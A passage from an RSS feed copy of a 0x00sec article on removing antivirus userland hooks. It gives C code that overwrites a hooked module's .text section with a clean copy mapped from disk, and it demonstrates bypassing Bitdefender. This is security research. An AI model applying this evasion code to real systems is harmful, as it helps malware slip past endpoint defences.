    PAGE_READONLY | SEC_IMAGE,   // Map it as an executable image.
    0,
    0,
    NULL
);

LPVOID lpMapping = MapViewOfFile(
    hFileMapping,       // From above
    FILE_MAP_READ,      // Same map permissions as above.
    0,
    0,
    0
);
</code></pre>
<h3>2. Removing the Hooks</h3>
<p>The original code can be extracted from the mapped module and then copied into the existing module to cleanse the hooks.</p>
<pre><code class="lang-makefile">Replacing hooked code with clean code

                 +---- +-------------+          +-------------+
                /      |   Headers   |          |   Headers   |
               /       +-------------+ -------&gt; +-------------+
+-------------+        |    .text    |          |    .text    |
|   Headers   |        |   (clean)   |  memcpy  |   (clean)   |
+-------------+        |             |          |             |
|    .text    |        +-------------+ -------&gt; +-------------+
|   (clean)   |        |             |          |             |
+-------------+        |    .data    |          |    .data    |
|    .data    |        |             |          |             |
+-------------+        +-------------+          +-------------+
|     ...     |        |             |          |             |
+-------------+        |     ...     |          |     ...     |
|    .rsrc    |        |             |          |             |
+-------------+        +-------------+          +-------------+
               \       |    .rsrc    |          |    .rsrc    |
                \      |             |          |             |
                 +---- +-------------+          +-------------+
     Clean                  Clean                   Cleaned
 module (disk)          module (memory)         module (memory)
</code></pre>
<p>Here is example code that performs this:</p>
<pre><code class="lang-auto">// Parse the PE headers.
PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)lpMapping;
PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpMapping + pidh-&gt;e_lfanew);

// Walk the section headers and find the .text section.
for (WORD i = 0; i &lt; pinh-&gt;FileHeader.NumberOfSections; i++) {
    PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pinh) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
    if (!strcmp(pish-&gt;Name, ".text")) {
        // Deprotect the module's memory region for write permissions.
        DWORD flProtect = ProtectMemory(
            (LPVOID)((DWORD_PTR)hModule + (DWORD_PTR)pish-&gt;VirtualAddress),    // Address to protect.
            pish-&gt;Misc.VirtualSize,                        // Size to protect.
            PAGE_EXECUTE_READWRITE                         // Desired protection.
        );

        // Replace the hooked module's .text section with the newly mapped module's.
        memcpy(
            (LPVOID)((DWORD_PTR)hModule + (DWORD_PTR)pish-&gt;VirtualAddress),
            (LPVOID)((DWORD_PTR)lpMapping + (DWORD_PTR)pish-&gt;VirtualAddress),
            pish-&gt;Misc.VirtualSize
        );

        // Reprotect the module's memory region.
        flProtect = ProtectMemory(
            (LPVOID)((DWORD_PTR)hModule + (DWORD_PTR)pish-&gt;VirtualAddress),    // Address to protect.
            pish-&gt;Misc.VirtualSize,                        // Size to protect.
            flProtect                                      // Revert to old protection.
        );
    }
}
</code></pre>
<p>Of course, doing this can be dangerous. For example, in the case there the application is multi-threaded and utilising the modules’ functions, race conditions will arise while the code is part-way being replaced and being executed at the same time. In this situation, suspending all other threads may be advised.</p>
<hr>
<h1>Demonstration</h1>
<p>I’ve discovered two hooked functions that trigger Bitdefender’s real-time monitoring functionality. Both show the raw execution of the functions and then Bitdefender detecting, blocking, and deleting the threats. The AntiHook PoC was then called to remove the hooks before performing the same action to show the bypassing of Bitdefender.</p>
<h2>CreateRemoteThread</h2>
<p>(on external process)</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/032246a3baf3a9b73872ef42f011c12710fd5a84.gif" width="" height=""></p>
<h2>DebugActiveProcess</h2>
<p>(on cmd.exe)</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/000d8286f8a2d28c82a884e110bf24a7a81e554a.gif" width="" height=""></p>
<hr>
<h1>Conclusion</h1>
<p>As we’ve seen, userland hooks are flawed in that they that allow malware to fight anti-virus software on equal ground. Although they increase the field of view for monitoring activity, they are potentially a trivial nuisance that can be sidestepped by sufficiently-equipped malware. Anti-virus using this technique should move away and develop something that is more robust as other non-userland-hooking solutions have done but I cannot say whether or not they are more or as effective.</p>
<p>Apologies for the very quick and rough article as I don’t have much time to dedicate towards writing right now. Hope that you’ve appreciated and learned something from this.</p>
<p>As always, the project is available on <a href="https://github.com/NtRaiseHardError/AntiHook">GitHub - https://github.com/NtRaiseHardError/AntiHook</a>.</p>
<p>– <em>dtm</em></p>
          <p><a href="https://0x00sec.org/t/defeating-userland-hooks-ft-bitdefender/12496/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/defeating-userland-hooks-ft-bitdefender/12496/1</link>
        <pubDate>Sun, 24 Mar 2019 04:35:59 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-12496-1</guid>
        <source url="https://0x00sec.org/t/defeating-userland-hooks-ft-bitdefender/12496.rss">Defeating Userland Hooks (ft. Bitdefender)</source>
      </item>
  </channel>
</rss>
